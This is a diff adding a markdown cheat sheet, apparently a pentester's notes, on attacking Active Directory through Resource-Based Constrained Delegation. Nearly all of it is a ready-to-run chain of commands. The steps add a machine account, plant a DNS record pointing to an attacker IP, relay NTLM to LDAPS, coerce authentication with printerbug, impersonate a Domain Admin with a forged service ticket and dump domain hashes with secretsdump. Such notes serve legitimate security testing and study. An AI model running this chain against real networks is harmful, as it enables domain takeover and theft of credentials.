@@ -1,0 +1,24 @@
+- Resource-Based Constrained Delegation
+	- msDS-AllowedToActOnBehalfOfOtherIdentity - Property on an AD object that allows what users or computers have rights to delegate to that object.
+		- Only accounts with SPNs, like machine accounts created by domain users, allowed to be added to this property
+	- Prerequisites:
+		- No LDAP signing on DCs
+			- `cme ldap –u ValidUser –p ValidPass –M ldap-signing`
+		- Account with a SPN that can be added to msDS-AllowedToActOnBehalfOfOtherIdentity
+			- Check: `cme smb –u ValidUser –p ValidPass –M maq`
+		- Need a way to coerce authentication (printerbug, petitpotam, etc.)
+	- Exploitation:
+		- Add machine account (with a SPN)
+			- `impacket-addcomputer -computer-name 'uniqueName' -dc-ip <DC_IP> domain/user:password`
+		- Add DNS record to force HTTP authentication
+			- `python3 /opt/krbrelayx/dnstool.py -u domain.local\\ValidUser -p ValidPass -a add -r <new_unique_DNS_name> -d <attacker_IP> <DC IP>`
+		- Start NTLM Relay
+			- `impacket-ntlmrelayx -t ldaps://dc01.domain.local -wh <attacker_IP> --delegate-access --escalate-user <owned_account_with_a_SPN> --no-dump --no-acl --no-da --no-validate-privs`
+		- Coerce authentication
+			- `python3 /opt/krbrelayx/printerbug.py domain.local/ValidUser:ValidPass@remoteHost <added_DNS_record>@80/fakepath`
+		- Request a TGS to impersonate a domain admin on the target host
+			- `impacket-getST -spn cifs/remoteHost.domain.local -impersonate <Domain_Admin> domain.local/ValidUser:ValidPass -dc-ip <DC_IP>`
+		- Set the ccache environment variable for impacket
+			- `export KRB5CCNAME=<Domain_Admin>.ccache`
+		- DCSync to dump hashes
+			- `impacket-secretsdump -k -no-pass remoteHost.domain.local`
